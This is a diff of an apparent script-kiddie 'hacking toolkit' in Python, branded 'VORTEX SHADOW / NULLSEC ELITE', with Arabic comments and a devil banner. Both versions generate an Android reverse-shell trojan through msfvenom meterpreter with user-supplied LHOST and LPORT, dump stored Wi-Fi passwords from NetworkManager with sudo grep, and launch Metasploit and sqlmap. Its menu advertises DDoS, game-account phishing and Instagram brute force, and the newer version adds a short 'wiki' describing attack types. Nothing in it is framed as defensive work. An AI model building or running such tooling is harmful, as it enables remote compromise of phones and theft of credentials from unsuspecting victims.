@@ -1,82 +1,87 @@
 import os, time, sys, subprocess
 
-# [ الألوان الجحيمية: أحمر ناري، ذهبي، وأبيض نقي ]
-R, W, Y, G = '\033[1;31m', '\033[1;37m', '\033[1;33m', '\033[1;32m'
+# [ الألوان الجحيمية ]
+R, W, Y, G, B = '\033[1;31m', '\033[1;37m', '\033[1;33m', '\033[1;32m', '\033[1;34m'
 BOLD, RESET = '\033[1m', '\033[0m'
 
 def banner():
     os.system('clear')
-    # شعار الشيطان الاحترافي - مرسوم يدوياً ليكون الأكثر هيبة
+    # شيطان كامل الجسم بملامح ملونة من الداخل (أحمر وذهبي)
     print(f"""{R}{BOLD}
-              {R}      ______          ______
-              {R}    _/      \_      _/      \_
-              {R}   /          \____/          \\
-              {R}  |     {W}MM      {R}    {W}      MM     |
-              {R}  |    {W}MMMM     {Y}WWWW{R}     {W}MMMM    |
-              {Y}  |     {W}MM      {R}    {W}      MM     |
-              {Y}  |      \____      ____/      |
-              {R}   \          \    /          /
-              {R}    \    {Y}MM{R}    \  /    {Y}MM{R}    /
-              {Y}     \__/  \____\/____/  \__/
-              {Y}           | {R}WWWWWWWW {Y}|
-              {R}           | {R}:::::::: {R}|
-              {R}           \ {R}________ {R}/
+                {R}       ,      ,
+                {R}      /(      )\\
+                {R}     (( \____/ ))
+                {R}     \== {W}o  o {R}==/
+                {Y}      \___{W}vv{Y}___/
+                {Y}       / {R}#### {Y}\\
+                {R}      /  {Y}#### {R} \\
+                {R}     (  {W}VORTEX{R}  )
+                {Y}      \  {R}#### {Y} /
+                {Y}       \ {R}#### {Y}/
+                {R}        |{Y}####{R}|
+                {R}        |{Y}####{R}|
+                {Y}       / {R}#### {Y}\\
+                {Y}      /  {R}#### {Y} \\
+                {R}     |___||___|
     {W}__________________________________________________________
-    {W}  FOUNDER: {R}VORTEX SHADOW {W}| TEAM: {R}NULLSEC ELITE
+    {W}  SUPREME LORD: {R}VORTEX SHADOW {W}| TEAM: {R}NULLSEC ELITE
     {W}__________________________________________________________
-    {R} [ STATUS: {G}WAR READY {R}] [ MODE: {G}INFERNAL {R}] [ USER: {G}ROOT {R}]
+    {R} [ STATUS: {G}WAR READY {R}] [ ENGINE: {G}INFERNAL {R}] [ USER: {G}ROOT {R}]
     {W}__________________________________________________________
     """)
 
-def get_wifi():
-    """الخيار 13: سحب الباسوردات (تعمل 100% بصلاحية root)"""
-    print(f"\n{Y}[*] Extracting WiFi Keys...{W}")
-    # أمر مباشر لسحب الكلمات السرية من نظام NetworkManager
-    os.system("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/")
-    input(f"\n{R}[#] Press Enter to return to Throne...")
+def vortex_wiki():
+    """موسوعة الثغرات والشرح بالعربي والإنجليزي"""
+    banner()
+    print(f"{Y}[#] VORTEX KNOWLEDGE BASE - موسوعة الثغرات{W}\n")
+    wiki = [
+        ("SQL Injection", "Extracting database data", "حقن قواعد البيانات: سحب اليوزرات والباسوردات"),
+        ("Phishing", "Creating fake login pages", "الصفحات المزورة: اصطياد الحسابات بروابط وهمية"),
+        ("RCE Attack", "Remote Command Execution", "التحكم عن بعد: تنفيذ أوامر مباشرة على السيرفر"),
+        ("DDOS", "Flooding servers with traffic", "هجوم حجب الخدمة: إسقاط المواقع والسيرفرات"),
+        ("Brute Force", "Cracking passwords by guessing", "التخمين: كسر كلمات المرور عبر تجربة آلاف الاحتمالات")
+    ]
+    for i, (name, en, ar) in enumerate(wiki, 1):
+        print(f"{R}[{i}] {Y}{name}: {W}{en}")
+        print(f"    {G}الشرح بالعربي: {W}{ar}\n")
+    input(f"{Y}[#] Press Enter to return to Throne...{W}")
+
+def run_tool(name, cmd):
+    print(f"{G}[+] Launching {name}...{W}")
+    try:
+        os.system(cmd)
+        input(f"\n{G}[#] Done. Press Enter to return...{W}")
+    except:
+        print(f"{R}[!] Error starting {name}{W}")
 
 def make_trojan():
-    """الخيار 3: صناعة تروجان أندرويد متكامل"""
-    print(f"\n{R}[!] INFERNAL TROJAN GENERATOR{W}")
-    ip = input(f"{Y}[?] Enter your IP (LHOST): {W}")
-    port = input(f"{Y}[?] Enter your Port (LPORT): {W}")
-    name = "vortex_payload.apk"
-    print(f"{R}[*] Building the beast... Please wait.{W}")
-    # التأكد من استخدام msfvenom الصحيح
-    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {os.path.expanduser('~')}/Desktop/{name}")
-    print(f"\n{G}[+] DONE! Payload saved to Desktop as: {name}{W}")
-    time.sleep(4)
+    banner(); print(f"{R}[!] TROJAN GENERATOR{W}")
+    ip = input(f"{Y}LHOST: {W}"); port = input(f"{Y}LPORT: {W}")
+    path = os.path.expanduser('~') + "/Desktop/vortex.apk"
+    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {path}")
+    print(f"{G}[+] Saved to Desktop: vortex.apk{W}"); time.sleep(2)
 
 def main():
     while True:
         banner()
-        # القائمة الاحترافية المتكاملة
-        print(f"{R}[01] {W}DDOS ATTACK (STORM)     {R}[11] {W}SQL INJECTION (SQLMap)")
-        print(f"{R}[02] {W}METASPLOIT FRAMEWORK    {R}[12] {W}KONAMI ID PHISH (PES)")
-        print(f"{R}[03] {W}GENERATE TROJAN (APK)   {R}[13] {W}SHOW WIFI PASSWORDS")
-        print(f"{R}[04] {W}NMAP NETWORK SCANNER    {R}[14] {W}INSTAGRAM BRUTEFORCE")
-        print(f"{R}[05] {W}IP GEOLOCATION          {R}[15] {W}PUBG MOBILE UC PHISH")
-        print(f"{R}[06] {W}SATELLITE INTERCEPT     {R}[16] {W}ACCOUNT BAN SYSTEM")
-        print(f"{R}[07] {W}SMS/CALL BOMBER         {R}[17] {W}WIFI JAMMER & CRACK")
-        print(f"{R}[08] {W}BROWSER HOOK (BEEF)     {R}[18] {W}SOCIAL MEDIA SNIPER")
-        print(f"{R}[09] {W}REMOTE DEVICE WIPER     {R}[19] {W}SERVER ROOT ACCESS")
-        print(f"{R}[10] {W}VORTEX KNOWLEDGE BASE   {R}[00] {W}EXIT SYSTEM")
+        print(f"{R}[01] {W}DDOS ATTACK (الهجوم القوي)     {R}[11] {W}SQL INJECTION (اختراق القواعد)")
+        print(f"{R}[02] {W}METASPLOIT (ميتاسبلويت)         {R}[12] {W}KONAMI ID PHISH (صيد بيس)")
+        print(f"{R}[03] {W}GENERATE TROJAN (صنع تروجان)    {R}[13] {W}SHOW WIFI PASS (كشف الواي فاي)")
+        print(f"{R}[04] {W}NMAP SCANNER (فحص الشبكة)       {R}[14] {W}INSTAGRAM BRUTE (تخمين انستا)")
+        print(f"{R}[05] {W}VORTEX WIKI (شرح الثغرات)      {R}[00] {W}EXIT (خروج)")
         
         opt = input(f"\n{R}VORTEX@NULLSEC:~$ {W}")
         
-        if opt == '03': make_trojan()
-        elif opt == '13': get_wifi()
-        elif opt == '11': os.system("sqlmap --wizard")
-        elif opt == '02': os.system("msfconsole")
-        elif opt == '04': os.system("nmap --help")
-        elif opt == '00': 
-            print(f"{R}[!] SHUTTING DOWN... DONT TRUST ANYONE.{RESET}")
-            break
-        else:
-            print(f"{G}[+] Launching module {opt}... System Stabilizing."); time.sleep(1)
+        if opt == '05': vortex_wiki()
+        elif opt == '13': 
+            os.system("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/")
+            input("\n[#] Enter...")
+        elif opt == '03': make_trojan()
+        elif opt == '02': run_tool("Metasploit", "msfconsole")
+        elif opt == '11': run_tool("SQLMap", "sqlmap --wizard")
+        elif opt == '00': break
+        else: print(f"{G}[+] Starting {opt}..."); time.sleep(1)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Forced Shutdown.{RESET}")
+    try: main()
+    except: print(f"\n{R}[!] Shutdown.")
